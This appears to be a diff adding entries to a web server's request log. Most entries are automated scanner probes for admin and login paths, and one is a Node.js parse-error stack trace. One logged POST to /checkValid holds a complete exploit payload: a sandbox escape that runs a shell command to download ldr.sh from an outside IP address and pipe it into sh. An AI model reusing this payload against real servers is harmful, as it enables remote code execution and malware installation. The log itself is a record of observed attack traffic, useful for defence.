@@ -1184,3 +1184,27 @@ GET / -  {}
 GET / -  {}
 GET / -  {}
 GET / -  {}
+GET /login.aspx -  {}
+
+  Error: Parse Error
+      at socketOnEnd (_http_server.js:568:22)
+      at Socket.emit (events.js:327:22)
+      at endReadableNT (internal/streams/readable.js:1327:12)
+      at processTicksAndRejections (internal/process/task_queues.js:80:21)
+
+GET /manager/html -  {}
+GET /login -  {}
+GET /jenkins/login -  {}
+GET / -  {}
+POST /checkValid -  {
+  document: 'this.constructor.constructor("return process")().mainModule.require("child_process").execSync("(curl --user-agent curl_cve_2019_10758 http://31.210.20.181/ldr.sh||wget --user-agent wget_cve_2019_10758 -q -O - http://31.210.20.181/ldr.sh)|sh")'
+}
+GET / -  {}
+HEAD http://112.124.42.80:63435/ -  {}
+GET / -  {}
+GET / -  {}
+GET /HNAP1/ -  {}
+GET / -  {}
+GET / -  {}
+GET / -  {}
+GET / -  {}
